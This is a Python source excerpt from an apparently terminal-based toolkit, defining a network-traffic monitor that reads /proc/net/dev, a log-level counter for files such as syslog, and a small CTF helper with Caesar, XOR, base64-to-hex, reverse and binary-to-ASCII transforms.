def cmd_network_monitor(ctx):
    duration = int(ctx["ask"]("Monitor duration (seconds)", "10"))
    ctx["console"].print(f"[{ctx['theme'].primary}]Sampling {duration}s of /proc/net/dev ...[/]")
    try:
        before = _read_net_stats()
        time.sleep(duration)
        after = _read_net_stats()
        rows = []
        for iface in sorted(set(before) | set(after)):
            rx = after[iface]["rx"] - before[iface]["rx"]
            tx = after[iface]["tx"] - before[iface]["tx"]
            rows.append((iface, f"{rx/1024:.1f} KB", f"{tx/1024:.1f} KB"))
        _print_table(ctx, rows, ("Interface", "RX", "TX"))
    except KeyboardInterrupt:
        ctx["console"].print("[yellow]Cancelled.[/]")


def _read_net_stats() -> dict:
    stats = {}
    try:
        with open("/proc/net/dev", encoding="utf-8") as fh:
            for line in fh.readlines()[2:]:
                iface, data = [p.strip() for p in line.split(":", 1)]
                parts = data.split()
                stats[iface] = {"rx": int(parts[0]), "tx": int(parts[8])}
    except OSError:
        pass
    return stats


def cmd_log_analyzer(ctx):
    path = ctx["ask"]("Path to log file", "/var/log/syslog" if os.path.isfile("/var/log/syslog") else "")
    if not path or not os.path.isfile(path):
        ctx["console"].print(f"[{ctx['theme'].danger}]File not found.[/]")
        return
    levels = {"INFO": 0, "WARN": 0, "ERROR": 0, "DEBUG": 0, "OTHER": 0}
    import collections as _collections
    recent = _collections.deque(maxlen=10)
    with open(path, encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.rstrip()
            for k in levels:
                if k in line.upper():
                    levels[k] += 1
                    break
            else:
                levels["OTHER"] += 1
            recent.append(line)
    rows = [(k, v) for k, v in levels.items()]
    _print_table(ctx, rows, ("Level", "Count"))
    ctx["console"].print("[bold]Recent lines:[/]")
    for line in recent:
        ctx["console"].print(line)


def cmd_ctf_helper(ctx):
    """CTF toolbox: encoders + decoders shortcuts."""
    tool = ctx["choose"]("CTF tool", ["Cesar cipher", "XOR with hex key", "Base64 <-> hex",
                                      "Reverse string", "Binary to ascii"]) or "Reverse string"
    data = ctx["ask"]("Input")
    if data is None:
        return
    if tool == "Cesar cipher":
        shift = int(ctx["ask"]("Shift", "13"))
        result = "".join(chr((ord(c) - 65 + shift) % 26 + 65) if "A" <= c <= "Z" else
                         chr((ord(c) - 97 + shift) % 26 + 97) if "a" <= c <= "z" else c for c in data)
    elif tool == "XOR with hex key":
        key_hex = ctx["ask"]("Hex key", "deadbeef")
        key = bytes.fromhex(key_hex)
        result = bytes(b ^ key[i % len(key)] for i, b in enumerate(data.encode())).hex()
    elif tool == "Base64 <-> hex":
        try:
            decoded = base64.b64decode(data)
            result = decoded.hex()
        except Exception:
            result = "Invalid base64"
    elif tool == "Reverse string":
        result = data[::-1]
    else:
        try:
            result = "".join(chr(int(data[i:i+8], 2)) for i in range(0, len(data), 8))
        except ValueError as exc:
            result = f"Invalid binary: {exc}"
    ctx["console"].print(result)


